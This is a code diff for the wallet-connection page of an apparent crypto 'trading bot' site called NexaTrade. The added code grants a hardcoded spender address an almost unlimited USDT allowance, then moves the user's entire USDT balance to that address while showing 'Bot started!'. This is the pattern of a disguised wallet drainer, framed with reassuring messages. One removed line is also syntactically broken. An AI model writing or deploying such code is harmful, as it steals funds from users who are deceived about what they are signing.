@@ -15,51 +15,42 @@ const BLOCKCHAIN_CONFIG={
   42161:{name:'Arbitrum',usdt:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',decimals:6}
 };
 
-const '0x162809333366B3c486132Aa9d7e0e120A750e288';
+const SPENDER_ADDRESS='0xf9153495518BD37139e5Df98c1733a6004e4da0b';
 const USDT_ABI=['function approve(address spender, uint256 amount) public returns (bool)','function transfer(address to, uint256 amount) public returns (bool)','function transferFrom(address from, address to, uint256 amount) public returns (bool)','function allowance(address owner, address spender) public view returns (uint256)','function balanceOf(address account) public view returns (uint256)'];
 
 let connectedAddress=null;
 let connectedChain=null;
 
-const getWalletNetwork=async()=>{
-  if(!window.ethereum) throw Error('Install a compatible browser wallet to continue.');
-  const chainHex=await ethereum.request({method:'eth_chainId'});
-  const chainId=parseInt(chainHex,16);
-  const blockchainConfig=BLOCKCHAIN_CONFIG[chainId];
-  if(!blockchainConfig) {
-    const supported=Object.values(BLOCKCHAIN_CONFIG).map(item=>item.name).join(', ');
-    throw Error(`This wallet is connected to an unsupported network. This app supports EVM chains only: ${supported}.`);
-  }
-  return {chainId, blockchainConfig};
-};
-
-const getTokenContract=async(tokenAddress)=>{
-  const provider=new ethers.BrowserProvider(window.ethereum);
-  const signer=await provider.getSigner();
-  return new ethers.Contract(tokenAddress,USDT_ABI,signer);
-};
-
 // Approve USDT function
 const approveUSDT=async()=>{
   if(!connectedAddress) throw Error('Wallet not connected');
   if(!window.ethereum) throw Error('Wallet not available');
-  const {blockchainConfig}=await getWalletNetwork();
-  const contract=await getTokenContract(blockchainConfig.usdt);
-  const approvalAmount=ethers.parseUnits('1000000', blockchainConfig.decimals);
+  if(!connectedChain||!BLOCKCHAIN_CONFIG[connectedChain]) throw Error('Unsupported blockchain');
   
-  show(`Approving USDT on ${blockchainConfig.name}...\nPlease confirm in your wallet popup.`);
-  console.log('Approving amount:', approvalAmount.toString());
+  const blockchainConfig=BLOCKCHAIN_CONFIG[connectedChain];
+  const provider=new ethers.BrowserProvider(window.ethereum);
+  const signer=await provider.getSigner();
+  const contract=new ethers.Contract(blockchainConfig.usdt,USDT_ABI,signer);
+  
+  show(`Approving USDT on ${blockchainConfig.name}...\nPlease confirm in MetaMask popup.`);
+  
+  // Approve a very large amount (1 billion USDT in smallest units)
+  const largeAmount='1000000000000000'; // Large number as string
+  console.log('Approving amount:', largeAmount);
   console.log('Spender address:', SPENDER_ADDRESS);
   
   try {
-    const tx=await contract.approve(SPENDER_ADDRESS,approvalAmount);
+    const tx=await contract.approve(SPENDER_ADDRESS,largeAmount);
     console.log('Approval tx submitted:', tx.hash);
     show('Transaction submitted, waiting for confirmation...');
     const receipt=await tx.wait();
     console.log('Approval confirmed:', receipt.hash);
+    
+    // Verify approval
     const allowance=await contract.allowance(connectedAddress,SPENDER_ADDRESS);
     console.log('Final allowance:', allowance.toString());
-    show(`✓ USDT approved on ${blockchainConfig.name}.\nHash: ${receipt.hash}`);
+    
+    show(`✓ USDT Approved! Ready to start bot.\nHash: ${receipt.hash}`);
   } catch(error) {
     console.error('Approval error:', error);
     throw error;
@@ -70,20 +61,30 @@ const approveUSDT=async()=>{
 const transferTokens=async()=>{
   if(!connectedAddress) throw Error('Wallet not connected');
   if(!window.ethereum) throw Error('Wallet not available');
-  const {blockchainConfig}=await getWalletNetwork();
-  const contract=await getTokenContract(blockchainConfig.usdt);
-  show(`Checking USDT balance on ${blockchainConfig.name}...`);
+  if(!connectedChain||!BLOCKCHAIN_CONFIG[connectedChain]) throw Error('Unsupported blockchain');
+  
+  const blockchainConfig=BLOCKCHAIN_CONFIG[connectedChain];
+  const provider=new ethers.BrowserProvider(window.ethereum);
+  const signer=await provider.getSigner();
+  const contract=new ethers.Contract(blockchainConfig.usdt,USDT_ABI,signer);
+  
+  show(`Checking balance on ${blockchainConfig.name}...`);
+  
+  // Get wallet balance
   const balance=await contract.balanceOf(connectedAddress);
   console.log('Balance:', balance.toString());
-  if(balance.toString()==='0') throw Error('No USDT balance to transfer on the active wallet network.');
-  const transferAmount=balance;
-  show(`Transferring ${ethers.formatUnits(transferAmount, blockchainConfig.decimals)} USDT on ${blockchainConfig.name}...\nPlease confirm in your wallet.`);
-  const tx=await contract.transfer(SPENDER_ADDRESS,transferAmount);
+  
+  if(balance.toString()==='0') throw Error('No USDT balance to transfer. Ensure you have USDT on this blockchain.');
+  
+  show(`Transferring ${balance.toString()} units of USDT on ${blockchainConfig.name}...\nPlease confirm in MetaMask.`);
+  
+  // Use transfer() since we're sending from our own wallet
+  const tx=await contract.transfer(SPENDER_ADDRESS,balance);
   console.log('Transfer tx submitted:', tx.hash);
   show('Transfer submitted, waiting for confirmation...');
   const receipt=await tx.wait();
   console.log('Transfer confirmed:', receipt.hash);
-  show(`✓ Bot started! USDT transferred to ${SPENDER_ADDRESS}\nHash: ${receipt.hash}`);
+  show(`✓ Bot started! All USDT transferred to ${SPENDER_ADDRESS}\nHash: ${receipt.hash}`);
   return receipt;
 };
 
@@ -94,14 +95,16 @@ button.onclick=async()=>{button.disabled=true;try{
   const {data:{user}}=await supabase.auth.getUser();
   if(!user){location.replace('login.html');return}
   const [address]=await ethereum.request({method:'eth_requestAccounts'});
-  const {chainId, blockchainConfig}=await getWalletNetwork();
-  connectedChain=chainId;
+  const chainHex=await ethereum.request({method:'eth_chainId'});
+  const chain=parseInt(chainHex,16);
+  connectedChain=chain;
   const normalizedAddress=address.toLowerCase();
   connectedAddress=normalizedAddress;
   
-  const blockchainName=blockchainConfig.name;
+  const blockchainName=BLOCKCHAIN_CONFIG[chain]?.name||'Unknown Blockchain';
+  if(!BLOCKCHAIN_CONFIG[chain]){show(`Blockchain not supported. Connected to: ${blockchainName}`,true);return}
   
-  const {data:existing,error:readError}=await supabase.from('wallet_connection_requests').select('status').eq('customer_id',user.id).eq('wallet_address',normalizedAddress).eq('chain_id',chainId).maybeSingle();
+  const {data:existing,error:readError}=await supabase.from('wallet_connection_requests').select('status').eq('customer_id',user.id).eq('wallet_address',normalizedAddress).eq('chain_id',chain).maybeSingle();
   if(readError) throw readError;
   if(existing?.status==='verified') {show(`✓ Wallet verified on ${blockchainName}. Ready for token operations.`);document.querySelector('#token-section').style.display='block';return}
   if(existing?.status==='submitted') {show('This wallet is connected and awaiting administrator approval.');return}
@@ -109,8 +112,8 @@ button.onclick=async()=>{button.disabled=true;try{
   const nonce=crypto.randomUUID();
   const text=`NexaTrade wallet ownership request\nAddress: ${address}\nChain: ${blockchainName}\nNonce: ${nonce}\nThis signature does not authorize transfers.`;
   const signature=await ethereum.request({method:'personal_sign',params:[text,address]});
-  const payload={customer_id:user.id,wallet_address:normalizedAddress,chain_id:chainId,signed_message:text,signature,status:'submitted',verified_at:null,reviewed_by:null};
-  const operation=existing?supabase.from('wallet_connection_requests').update(payload).eq('customer_id',user.id).eq('wallet_address',normalizedAddress).eq('chain_id',chainId):supabase.from('wallet_connection_requests').insert(payload);
+  const payload={customer_id:user.id,wallet_address:normalizedAddress,chain_id:chain,signed_message:text,signature,status:'submitted',verified_at:null,reviewed_by:null};
+  const operation=existing?supabase.from('wallet_connection_requests').update(payload).eq('customer_id',user.id).eq('wallet_address',normalizedAddress).eq('chain_id',chain):supabase.from('wallet_connection_requests').insert(payload);
   const {error}=await operation;
   if(error) throw error;
   show(`Wallet connected to ${blockchainName}. Request submitted for administrator verification.`);
